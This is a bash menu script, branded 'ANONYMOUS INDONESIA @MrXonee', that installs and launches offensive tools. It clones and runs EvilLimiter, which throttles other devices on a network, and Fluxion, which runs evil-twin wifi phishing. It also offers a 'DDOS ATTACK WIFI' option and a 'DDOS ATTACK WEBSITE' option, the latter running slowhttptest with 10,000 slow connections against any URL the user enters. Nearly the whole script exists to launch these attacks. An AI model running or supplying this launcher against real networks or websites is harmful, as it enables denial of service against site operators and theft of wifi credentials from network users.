#!/bin/bash

clear
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "Author : MrXonee" | lolcat
echo "Github : https://github.com/MrXonee/Tools" | lolcat
echo "##################################################################################"
toilet -f term "   /\_/\ " | lolcat
toilet -f term " =[ •~• ]= " | lolcat
toilet -f term "    [\]_" | lolcat
toilet -f term " /\---------/\      J" | lolcat
toilet -f term "| |)  •  ~  • |   R • R" | lolcat
toilet -f term "| |^^^^^^^^^^^| M ••|•• M" | lolcat
toilet -f term "| |^^^^^^^^^^^] M ••|•• M" | lolcat
toilet -f term "| |ΩΩ=======ΩΩ]   R • R" | lolcat
toilet -f term "| |___________|     J" | lolcat
toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
echo "**********************************************************************************"
echo "[!] USE A USB WIRELESS ADAPTER [!]" | lolcat
echo "**********************************************************************************"
echo "$1[1]─>>INSTALL ALL PACKAGE FOR RUNNING TOOLS" | lolcat
echo "$2[2]─>>CONTROL NETWORK WIFI EVILLIMITER" | lolcat
echo "$3[3]─>>PENETRATION TESTING WIFI FLUXION" | lolcat
echo "$4[4]─>>VULNERABILITY SCANNING WEBSITE REDHAWK" | lolcat
echo "$5[5]─>>DDOS ATTACK WIFI" | lolcat
echo "$6[6]─>>DDOS ATTACK WEBSITE" | lolcat
echo "$7[7]─>>CHECK IP ADDRESS WEBSITE" | lolcat
echo "$8[8]─>>" | lolcat
echo "$9[9]─>>EXIT" | lolcat
echo "**********************************************************************************"
echo "╭─[MrXonee@root]" | lolcat
read -p"╰─>> " pil

if [ $pil = 1 ]
then
echo $i"Openning... "
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]SEMUA PACKAGE AKAN DI INSTALL MOHON TUNGGU SAMPAI SELESAI" | lolcat
echo "##################################################################################"
sleep 1
apt update -y
apt upgrade -y
apt install bc -y
apt install mdk3 -y
apt install cowpatty -y
apt install dsniff -y
apt install hostapd -y
apt install xterm -y
apt install php-cgi -y
apt install mdk4 -y
apt install lighttpd -y
apt install isc-dhcp-server -y
apt install toilet -y
apt install figlet -y
apt install lolcat -y
apt install autossh -y
apt install php -y
apt install php-curl -y
apt install php-xml -y
apt install python3 -y
apt install openssl -y
apt install git -y
apt install slowhttptest -y
echo "##################################################################################"
echo "SEMUA PACKAGE BERHASIL DI INSTALL" | lolcat
echo "##################################################################################"
sleep 5
bash it.sh
fi

if [ $pil = 2 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]RUNNING TOOLS EVILLIMITER" | lolcat
echo "##################################################################################"
sleep 5
git clone https://github.com/bitbrute/evillimiter
ifconfig eth0 down
cd evillimiter
python3 setup.py install
evillimiter
fi

if [ $pil = 3 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]RUNNING TOOLS FLUXION" | lolcat
echo "##################################################################################"
sleep 5
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
bash fluxion.sh
fi

if [ $pil = 4 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]RUNNING TOOLS REDHAWK" | lolcat
echo "##################################################################################"
sleep 5
git clone https://github.com/Tuhinshubhra/RED_HAWK.git
cd RED_HAWK
php rhawk.php
fi

if [ $pil = 5 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]RUNNING TOOLS DDOS ATTACK WIFI" | lolcat
echo "##################################################################################"
sleep 5
sudo python3 ddos.py
fi

if [ $pil = 6 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]RUNNING TOOLS DDOS ATTACK WEBSITE" | lolcat
echo "##################################################################################"
sleep 5
echo "╭─[Masukan URL Website HTTP]" | lolcat
read -p"╰─>> " url
slowhttptest -c 10000 -H -g -o slowhttp -i 10 -r 200 -t GET -u $url
fi

if [ $pil = 7 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]RUNNING TOOLS CHECK IP ADDRESS WEBSITE" | lolcat
echo "##################################################################################"
sleep 5
python3 checkip.py
fi

if [ $pil = 8 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "[!]" | lolcat
echo "##################################################################################"
sleep 5
fi

if [ $pil = 9 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################"
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************"
echo "##################################################################################"
echo "[+]TERIMAKASIH SUDAH MEMAKAI TOOLS MrXonee" | lolcat
echo "[+]SEE YOU BYE" | lolcat
echo "##################################################################################"
sleep 5
airmon-ng stop wlan0mon
service NetworkManager restart
exit
fi
